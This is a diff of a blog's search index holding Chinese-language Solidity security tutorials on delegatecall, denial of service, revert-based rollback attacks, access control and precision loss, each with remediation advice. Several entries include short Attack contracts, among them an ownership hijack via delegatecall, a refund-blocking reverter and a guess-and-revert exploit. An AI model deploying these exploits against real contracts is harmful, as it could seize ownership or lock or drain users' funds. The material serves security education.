 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (balance &lt; 100) &#123;</span><br><span class="line">    if (balance &gt; 300) &#123;</span><br><span class="line">        ...</span><br><span class="line">        return balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>]]></content>
       <tags>
-        <tag>智能合约安全审计</tag>
         <tag>Solidity</tag>
+        <tag>智能合约安全审计</tag>
       </tags>
   </entry>
   <entry>
@@ -240,36 +278,65 @@
       </tags>
   </entry>
   <entry>
-    <title>Delegatecall漏洞</title>
-    <url>/2023/06/11/Delegatecall%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h3 id="call-和-delegatecall-的区别"><a href="#call-和-delegatecall-的区别" class="headerlink" title="call 和 delegatecall 的区别"></a>call 和 delegatecall 的区别</h3><ul>
-<li>call：调用后内置变量 msg 的值会修改为调用者，执行环境为被调用者的运行环境；</li>
-<li>delegatecall：调用后内置变量 msg 的值不会修改为调用者，但执行环境为调用者的运行环境；</li>
-</ul>
-<h4 id="call"><a href="#call" class="headerlink" title="call"></a>call</h4><img lazyload src="/images/loading.svg" data-src="/2023/06/11/Delegatecall%E6%BC%8F%E6%B4%9E/call_01.jpg" class alt="alt text">
-<p>当用户A通过合约B来call合约C的时候，执行的是合约C的函数，上下文(Context，可以理解为包含变量和状态的环境)也是合约C的：msg.sender是B的地址，并且如果函数改变一些状态变量，产生的效果会作用于合约C的变量上。</p>
-<h4 id="delegatecall"><a href="#delegatecall" class="headerlink" title="delegatecall"></a>delegatecall</h4><img lazyload src="/images/loading.svg" data-src="/2023/06/11/Delegatecall%E6%BC%8F%E6%B4%9E/delegatecall_01.jpg" class alt="alt text">
-<p>当用户A通过合约B来delegatecall合约C的时候，执行的是合约C的函数，但是上下文仍是合约B的：msg.sender是A的地址，并且如果函数改变一些状态变量，产生的效果会作用于合约B的变量上。</p>
-<p>另外，当使用 delegatecall 函数进行外部调用涉及到 storage 变量的修改时是根据插槽位置来修改的而不是变量名。如下代码：</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line"></span><br><span class="line">contract A &#123;</span><br><span class="line">    address public c;</span><br><span class="line">    address public a;</span><br><span class="line"></span><br><span class="line">    function test() public returns (address b)&#123;</span><br><span class="line">        b = address(this);</span><br><span class="line">        a = b;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract B &#123;</span><br><span class="line">    address public a;</span><br><span class="line">    address public c;</span><br><span class="line"></span><br><span class="line">    address Aaddress ;</span><br><span class="line"></span><br><span class="line">    constructor(address _Aaddress) &#123;</span><br><span class="line">        Aaddress = _Aaddress;   // 传入A合约的地址</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testDelegatecall() public&#123;</span><br><span class="line">        Aaddress.delegatecall(abi.encodeWithSignature(&quot;test()&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-<p>A 合约中 address c 存储在 slot0 中，address a 存储在 slot1 中，反之在 B 合约中 address a 存储在 slot0 中，address c 存储在 slot1 中。当我们通过调用 B 合约中的 delegatecall 函数调用 A 合约中的 test 函数时，test 函数修改的是 A 合约中 slot1 这个插槽，所以代码运行的结果是 B 合约中的 address c 被修改了，因为在 B 合约中的 slot1 对应的正是 address c 这个地址存储的位置。</p>
-<h3 id="delegatecall-漏洞"><a href="#delegatecall-漏洞" class="headerlink" title="delegatecall 漏洞"></a>delegatecall 漏洞</h3><p>也叫代理合约所有者操纵漏洞，该漏洞允许攻击者操纵代理合约的所有者（下文中B合约为代理合约）。</p>
-<p>以下代码中，可以看到有两个合约，A 合约中通过 test() 函数用来修改合约的 owner，在 B 合约中存在 fallback 函数，fallback 函数的内容是使用 delegatecall 去调用 A 合约中的函数。我们通过 Attack 合约，利用 B.fallback() 触发 delegatecall 函数去调用 A.test() 将 B 合约中的 owner 改成 Attack 合约，从而控制 B 合约。</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line"></span><br><span class="line">contract A &#123;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    function test() public &#123;   // 这里方便演示漏洞效果使用public，实际中会有权限校验。</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract B &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    A public a;</span><br><span class="line"></span><br><span class="line">    constructor(A _a) &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        a = A(_a);   // 传入A合约的地址</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external  &#123;</span><br><span class="line">        address(a).delegatecall(msg.data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    address public b;</span><br><span class="line"></span><br><span class="line">    constructor(address _b) &#123;</span><br><span class="line">        b = _b;    // 传入B合约的地址</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        b.call(abi.encodeWithSignature(&quot;test()&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+    <title>拒绝服务攻击</title>
+    <url>/2023/09/09/%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/</url>
+    <content><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>拒绝服务（DOS）攻击是一种常见的网络攻击手段，其目的是通过向目标服务器发送大量请求或占用其资源，使其无法正常处理合法用户的请求。在智能合约中，攻击者可以通过发送恶意交易或利用智能合约中的漏洞使得智能合约系统无法正常运行，从而导致服务拒绝或系统瘫痪，因此智能合约的设计和实现应该考虑到DOS攻击的威胁并采取相应的安全措施来保障系统的稳定性和可靠性。</p>
+<p>拒绝服务主要包含以下四大类：</p>
+<p><strong>非预期的外部调用</strong></p>
+<p>当合约对外部调用处理不当时可能导致拒绝服务。例如合约中存在基于外部函数执行的结果来改变合约状态且没有对交易一直失败的情况做出处理，攻击者会利用这个特点故意使交易失败，合约则会一直重复这笔失败的交易从而造成合约逻辑卡在这里不能继续执行，最后使得智能合约暂时或永久不可用。</p>
+<p><strong>Gas达到区块上限</strong></p>
+<p>当交易的gas开销达到区块上限时交易会失败，导致拒绝服务。例如合约中的映射或数组长度没有限制，导致循环遍历时消耗大量的 gas ，当 gas limit 高于可用的 max limit时，导致交易失败。</p>
+<p><strong>逻辑设计缺陷</strong></p>
+<p>当合约自身的逻辑实现存在缺陷时，攻击者可利用该缺陷导致合约不可用。例如当合约的某个功能没有考虑全面，而实际使用存在多种极端情况，合约中某个功能无法正常处理特殊的交易或陷入瘫痪，最后导致拒绝服务。</p>
+<p><strong>运营管理不当</strong></p>
+<p>当合约后期运营管理不当可能导致拒绝服务。例如 Owner 或 管理员权限过大，敏感操作失误或私钥丢失等可能会导致拒绝服务攻击，如 selfdestruct 函数被非预期执行。</p>
+<h3 id="漏洞示例"><a href="#漏洞示例" class="headerlink" title="漏洞示例"></a>漏洞示例</h3><p>下面代码中是个DoS漏洞的游戏，玩家们先存钱，游戏结束后，调用 deposit 退钱。<br>由于在调用 refund 取款的时候由于 Attack 合约中有 fallback、receive 中执行了 revert 回退，导致 DosGame.refund 的 call 检查转账结果返回 false 而导致合约无法正常提款。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line"></span><br><span class="line">contract DosGame &#123;</span><br><span class="line">    bool public refundFinished;</span><br><span class="line">    mapping(address =&gt; uint256) public balanceOf;</span><br><span class="line">    address[] public players;</span><br><span class="line"></span><br><span class="line">    // 所有玩家存ETH到合约里</span><br><span class="line">    function deposit() external payable &#123;</span><br><span class="line">        require(!refundFinished, &quot;Game Over&quot;);</span><br><span class="line">        require(msg.value &gt; 0, &quot;Please donate ETH&quot;);</span><br><span class="line">        // 记录存款</span><br><span class="line">        balanceOf[msg.sender] = msg.value;</span><br><span class="line">        // 记录玩家地址</span><br><span class="line">        players.push(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 游戏结束，退款开始，所有玩家将依次收到退款</span><br><span class="line">    function refund() external &#123;</span><br><span class="line">        require(!refundFinished, &quot;Game Over&quot;);</span><br><span class="line">        uint256 pLength = players.length;</span><br><span class="line">        // 通过循环给所有玩家退款</span><br><span class="line">        for(uint256 i; i &lt; pLength; i++)&#123;</span><br><span class="line">            address player = players[i];</span><br><span class="line">            uint256 refundETH = balanceOf[player];</span><br><span class="line">            (bool success, ) = player.call&#123;value: refundETH&#125;(&quot;&quot;);</span><br><span class="line">            require(success, &quot;Refund Fail!&quot;);</span><br><span class="line">            balanceOf[player] = 0;</span><br><span class="line">        &#125;</span><br><span class="line">        refundFinished = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balance() external view returns(uint256)&#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    // 退款时进行DoS攻击</span><br><span class="line">    fallback() external payable&#123;</span><br><span class="line">        revert(&quot;DoS Attack!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        revert(&quot;DoS Attack!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 参与DoS游戏并存款</span><br><span class="line">    function attack(address gameAddr) external payable &#123;</span><br><span class="line">        DosGame dos = DosGame(gameAddr);</span><br><span class="line">        dos.deposit&#123;value: msg.value&#125;();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
 
-<h3 id="delegatecall-漏洞进阶版"><a href="#delegatecall-漏洞进阶版" class="headerlink" title="delegatecall 漏洞进阶版"></a>delegatecall 漏洞进阶版</h3><p>先看代码</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line"></span><br><span class="line">contract A &#123;</span><br><span class="line">    uint public someNumber;</span><br><span class="line"></span><br><span class="line">    function doSomething(uint _num) public &#123;</span><br><span class="line">        someNumber = _num;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract B &#123;</span><br><span class="line">    address public a;    // slot 0</span><br><span class="line">    address public owner;   // slot 1</span><br><span class="line">    uint public someNumber;</span><br><span class="line"></span><br><span class="line">    constructor(address _a) &#123;</span><br><span class="line">        a = _a;    // 传入A合约的地址</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function doSomething(uint _num) public &#123;</span><br><span class="line">        a.delegatecall(abi.encodeWithSignature(&quot;doSomething(uint256)&quot;, _num));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    address public a;    // slot 0</span><br><span class="line">    address public owner;  // slot 1</span><br><span class="line">    uint public someNumber;</span><br><span class="line"></span><br><span class="line">    B public b;</span><br><span class="line"></span><br><span class="line">    constructor(B _b) &#123;</span><br><span class="line">        b = B(_b);   // 传入B合约的地址</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        b.doSomething(uint(uint160(address(this))));   // 第一次调用替换B合约中的a地址为当前合约地址</span><br><span class="line">        b.doSomething(1);      // 第二次调用当前合约的doSomething()函数</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function doSomething(uint _num) public &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-<p>攻击流程：</p>
-<ul>
-<li>用户 部署 A 合约；</li>
-<li>用户 部署 B 合约并在构造函数中传入 A 合约的地址；</li>
-<li>攻击者 部署 Attack 合约并在构造函数中传入 B 合约的地址；</li>
-<li>攻击者调用 Attack.attack() 函数将 B 合约中的 owner 变为自己。</li>
-</ul>
 <h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><ul>
-<li>在使用 delegatecall 时应注意被调用合约的地址不能是可控的；</li>
-<li>在较为复杂的合约环境下需要注意变量的声明顺序以及存储位置。因为使用 delegatecall 进行外部调时会根据被调用合约的数据结构来用修改本合约相应 slot 中存储的数据，在数据结构发生变化时这可能会造成非预期的变量覆盖。</li>
+<li>在进行外部调用时返回结果是否符合预期，不应完全依赖外部调用结果；</li>
+<li>在使用循环或外部调用或复杂操作时，应考虑 Gas 消耗；</li>
+<li>合约逻辑设计应充分考虑所有可能的情况，并进行适当的处理；</li>
+<li>避免对单个角色过度授权，处理合约权限是应做到合理的权限划分，对拥有权限的角色使用多签钱包管理，防止由于私钥泄露导致权限丢失。</li>
 </ul>
+]]></content>
+      <tags>
+        <tag>Solidity</tag>
+        <tag>智能合约安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>回退攻击</title>
+    <url>/2023/09/30/%E5%9B%9E%E9%80%80%E6%94%BB%E5%87%BB/</url>
+    <content><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>回退攻击是根据执行结果来决定的，如果操作结果没有达到攻击者预期的效果，攻击者会让交易回退。使用 require(), revert() 和 assert() 可以使不满足条件的调用失败，从而回退交易。</p>
+<p><strong>require(), revert() 和 assert()</strong><br>是Solidity 0.4.10及之后的版本中错误处理机制，下面3个语句等价：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(condition) &#123; revert(); &#125;</span><br><span class="line"></span><br><span class="line">assert(condition);</span><br><span class="line"></span><br><span class="line">require(condition);</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>1. require</strong></p>
+<ul>
+<li>通常用于执行前输入验证和状态检查，一般用于函数的开头处；</li>
+<li>退还剩余的 Gas；</li>
+</ul>
+<p><strong>2. revert</strong></p>
+<ul>
+<li>通常用于直接触发回退，可自定义异常处理，适用于更复杂逻辑的处理场景；</li>
+<li>退还剩余的 Gas；</li>
+</ul>
+<p><strong>3. aasert</strong></p>
+<ul>
+<li>通常用于预防不应该发生的情况，失败的断言可能意味着代码层存在错误；</li>
+<li>消耗所有剩余的 Gas，并回退所有的操作；</li>
+</ul>
+<p><strong>利用条件</strong></p>
+<ul>
+<li>随机性。合约中的执行结果具有随机性，想要达到预期的执行结果需要进行多次尝试，如果每次执行结果是一样的就没有必要进行回退。</li>
+<li>允许合约调用。攻击者可以在合约中定义攻击逻辑，如果执行结果非期望的结果则进行回退，直到得到期望的结果。如果是 EOA 账户，在交易执行中无法对结果进行判断，只能在交易完成后才能访问结果，此时交易已经完成，区块链状态已经更新则不能进行回退。</li>
+<li>有利可图。合约运行结果中，存在某个结果是有利可图的。</li>
+</ul>
+<h3 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h3><p>以下代码是一个猜数字游戏，猜中数字即可获取 1 个ETH，猜错需要付出 0.1 个ETH，利用回退攻击，只要猜错就执行回退，因此可以通过消耗 gas 费来赢得奖励。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line"></span><br><span class="line">contract GuessNum &#123;</span><br><span class="line">    constructor() payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function _getRandom() internal view returns(uint256 random) &#123;</span><br><span class="line">        // 此处方便漏洞案例演示，采用伪随机数,请忽略随机数漏洞</span><br><span class="line">        random = uint256(keccak256(abi.encodePacked(block.coinbase, block.difficulty, block.timestamp))) % 10;  </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function guess(uint256 num) public  payable  &#123;</span><br><span class="line">        uint256 rand = _getRandom();</span><br><span class="line">        if ( rand == num) &#123;</span><br><span class="line">            payable(msg.sender).transfer(1 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getBalance() external view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    constructor() payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function rollBack(address gameAddr, uint256 num) external payable &#123;</span><br><span class="line">        uint256 beforeBalance = address(this).balance;</span><br><span class="line">        (bool success, ) = address(gameAddr).call&#123;value: 0.1 ether&#125;(abi.encodeWithSignature(&quot;guess(uint256)&quot;, num));</span><br><span class="line">        require(success, &quot;Failed to call.&quot;);</span><br><span class="line">        uint256 afterBalance = address(this).balance;</span><br><span class="line">        if (afterBalance &lt; beforeBalance) &#123;  // 通过余额来判断是否猜对，来决定是否进行回退。</span><br><span class="line">            revert(&quot;Failed to guessNum.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function getBalance() external view returns (uint256) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>只允许 EOA 账户进行调用 或 限制特定合约地址调用。</p>
 ]]></content>
       <tags>
         <tag>Solidity</tag>
@@ -347,22 +414,35 @@
       </tags>
   </entry>
   <entry>
-    <title>算术精度损失</title>
-    <url>/2024/01/21/%E7%AE%97%E6%9C%AF%E7%B2%BE%E5%BA%A6%E6%8D%9F%E5%A4%B1/</url>
-    <content><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>由于 Solidity 不支持浮点运算，对于整数除法，小于除数的精度会被舍弃，从而导致精度损失。</p>
-<p>实际中，精度损失大致分为两种：</p>
+    <title>访问控制漏洞</title>
+    <url>/2023/09/02/%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>合约没有正确的实现权限控制机制，导致未经授权的用户可以访问敏感函数或数据。例如，合约中的敏感函数没有适当的访问控制修饰符，使任何人都可以调用。访问控制漏洞主要分两个方面：</p>
+<p><strong>1. 代码层可见性</strong></p>
+<p>针对函数和变量，限制其所能修改和调用的作用域。</p>
 <ul>
-<li>四舍五入计算问题，在进行除法或减法运算时，计算顺序可能会导致精度损失；</li>
-<li>错误的向上或向下取整，可能导致本应为 0 的值取为 1 ，使得后续计算出现严重偏差。</li>
+<li>public: 函数或状态变量可以从合约内部和外部进行访问；</li>
+<li>external: 只能被其它合约调用，不能在当前合约内部直接调用，不能用于修饰变量，只能修饰函数。外部函数通常用于提供合约的接口，可以从其它合约或外部交易调用。</li>
+<li>internal: 函数或状态变量可以在当前合约内部以及继承合约中进行访问。也是默认的函数和状态变量修饰符（Solidity高版本中编译器会为没有明确设置可见性的函数和状态变量显示告警）。</li>
+<li>private:  函数或状态变量仅能在当前合约内部访问，私有函数和状态变量对于外部地址是不可见的，只能在合约内的其它函数中使用。</li>
 </ul>
-<h3 id="漏洞示例"><a href="#漏洞示例" class="headerlink" title="漏洞示例"></a>漏洞示例</h3><p>以下例子中，通过改变乘法和除法的计算顺序，导致计算结果不同。</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line"></span><br><span class="line">contract IntDivison &#123;</span><br><span class="line">    uint256 a = 100 ;</span><br><span class="line">    uint256 b = 15 ;</span><br><span class="line">    uint256 c = 30 ;</span><br><span class="line"></span><br><span class="line">    function test1() public view returns(uint256) &#123;</span><br><span class="line">        return a / b * c ;   // 计算结果为 180</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function test2() public view returns(uint256) &#123;</span><br><span class="line">        return a * c / b ;   // 计算结果为 200</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-<p>这里暂不考虑整数溢出的情况，溢出问题见整型溢出章节。</p>
+<p><strong>2. 逻辑层权限约束</strong></p>
+<p>通常针对函数，限制某些特权用户访问。</p>
+<ul>
+<li>modifier:  常用于在函数执行前检查某种前置条件，封装为函数修改器，提升代码的复用性，可传参可被继承，还可以多个修改器同时使用。</li>
+</ul>
+<h3 id="常见场景"><a href="#常见场景" class="headerlink" title="常见场景"></a>常见场景</h3><p><strong>不受限制的敏感函数：</strong> 合约中函数如果包含了敏感操作，并且对外公开，会导致任何人都可以调用。如初始化操作，取款，销毁等</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function burn(address account, uint256 amount) public &#123;  // 任何人都可以调用</span><br><span class="line">  _burn(account, amount); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>角色过度授权：</strong> 如果角色权限实现逻辑存在缺陷，就可能存在过度授权的风险。例如，合约为管理员角色授予了太多权限，使其能够执行合约的关键功能。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function criticalFunction() public onlyAdmin &#123;</span><br><span class="line">  // 关键功能</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h3><p>以下代码是修改合约所有者（owner），由于 changeOwner() 是 public 的，所以任何外部账户或合约都可以调用。因此，攻击者可以调用该函数改变合约的所有权并取得控制权。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line"></span><br><span class="line">contract AuthTest &#123;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function changeOwner(address _newOwner) public &#123; // 任何人都可以调用修改 owner</span><br><span class="line">        owner = _newOwner;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
 <h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><ul>
-<li>调整运算的操作顺序，例如整数乘法优先于除法进行计算；</li>
-<li>增加整数的数量级，例如以太坊中使用最小单位 wei（1 ETH &#x3D; 1e18 wei）处理数学计算，</li>
-<li>设置合适的舍入规则，对于向上&#x2F;向下取整的情况，应考虑多种复杂的场景；</li>
-<li>使用安全有效的高精度计算库；</li>
+<li>合理使用可见性修饰符和 modifier 进行约束，遵循<strong>最小权限原则</strong>；</li>
+<li>设计合理的访问控制模型，且与代码实现逻辑一直；</li>
+<li>使用形式化验证检测访问控制漏洞。</li>
 </ul>
 ]]></content>
       <tags>
@@ -437,102 +517,23 @@
       </tags>
   </entry>
   <entry>
-    <title>访问控制漏洞</title>
-    <url>/2023/09/02/%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>合约没有正确的实现权限控制机制，导致未经授权的用户可以访问敏感函数或数据。例如，合约中的敏感函数没有适当的访问控制修饰符，使任何人都可以调用。访问控制漏洞主要分两个方面：</p>
-<p><strong>1. 代码层可见性</strong></p>
-<p>针对函数和变量，限制其所能修改和调用的作用域。</p>
+    <title>算术精度损失</title>
+    <url>/2024/01/21/%E7%AE%97%E6%9C%AF%E7%B2%BE%E5%BA%A6%E6%8D%9F%E5%A4%B1/</url>
+    <content><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>由于 Solidity 不支持浮点运算，对于整数除法，小于除数的精度会被舍弃，从而导致精度损失。</p>
+<p>实际中，精度损失大致分为两种：</p>
 <ul>
-<li>public: 函数或状态变量可以从合约内部和外部进行访问；</li>
-<li>external: 只能被其它合约调用，不能在当前合约内部直接调用，不能用于修饰变量，只能修饰函数。外部函数通常用于提供合约的接口，可以从其它合约或外部交易调用。</li>
-<li>internal: 函数或状态变量可以在当前合约内部以及继承合约中进行访问。也是默认的函数和状态变量修饰符（Solidity高版本中编译器会为没有明确设置可见性的函数和状态变量显示告警）。</li>
-<li>private:  函数或状态变量仅能在当前合约内部访问，私有函数和状态变量对于外部地址是不可见的，只能在合约内的其它函数中使用。</li>
+<li>四舍五入计算问题，在进行除法或减法运算时，计算顺序可能会导致精度损失；</li>
+<li>错误的向上或向下取整，可能导致本应为 0 的值取为 1 ，使得后续计算出现严重偏差。</li>
 </ul>
-<p><strong>2. 逻辑层权限约束</strong></p>
-<p>通常针对函数，限制某些特权用户访问。</p>
-<ul>
-<li>modifier:  常用于在函数执行前检查某种前置条件，封装为函数修改器，提升代码的复用性，可传参可被继承，还可以多个修改器同时使用。</li>
-</ul>
-<h3 id="常见场景"><a href="#常见场景" class="headerlink" title="常见场景"></a>常见场景</h3><p><strong>不受限制的敏感函数：</strong> 合约中函数如果包含了敏感操作，并且对外公开，会导致任何人都可以调用。如初始化操作，取款，销毁等</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function burn(address account, uint256 amount) public &#123;  // 任何人都可以调用</span><br><span class="line">  _burn(account, amount); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<p><strong>角色过度授权：</strong> 如果角色权限实现逻辑存在缺陷，就可能存在过度授权的风险。例如，合约为管理员角色授予了太多权限，使其能够执行合约的关键功能。</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function criticalFunction() public onlyAdmin &#123;</span><br><span class="line">  // 关键功能</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h3><p>以下代码是修改合约所有者（owner），由于 changeOwner() 是 public 的，所以任何外部账户或合约都可以调用。因此，攻击者可以调用该函数改变合约的所有权并取得控制权。</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line"></span><br><span class="line">contract AuthTest &#123;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function changeOwner(address _newOwner) public &#123; // 任何人都可以调用修改 owner</span><br><span class="line">        owner = _newOwner;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
+<h3 id="漏洞示例"><a href="#漏洞示例" class="headerlink" title="漏洞示例"></a>漏洞示例</h3><p>以下例子中，通过改变乘法和除法的计算顺序，导致计算结果不同。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line"></span><br><span class="line">contract IntDivison &#123;</span><br><span class="line">    uint256 a = 100 ;</span><br><span class="line">    uint256 b = 15 ;</span><br><span class="line">    uint256 c = 30 ;</span><br><span class="line"></span><br><span class="line">    function test1() public view returns(uint256) &#123;</span><br><span class="line">        return a / b * c ;   // 计算结果为 180</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function test2() public view returns(uint256) &#123;</span><br><span class="line">        return a * c / b ;   // 计算结果为 200</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>这里暂不考虑整数溢出的情况，溢出问题见整型溢出章节。</p>
 <h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><ul>
-<li>合理使用可见性修饰符和 modifier 进行约束，遵循<strong>最小权限原则</strong>；</li>
-<li>设计合理的访问控制模型，且与代码实现逻辑一直；</li>
-<li>使用形式化验证检测访问控制漏洞。</li>
+<li>调整运算的操作顺序，例如整数乘法优先于除法进行计算；</li>
+<li>增加整数的数量级，例如以太坊中使用最小单位 wei（1 ETH &#x3D; 1e18 wei）处理数学计算，</li>
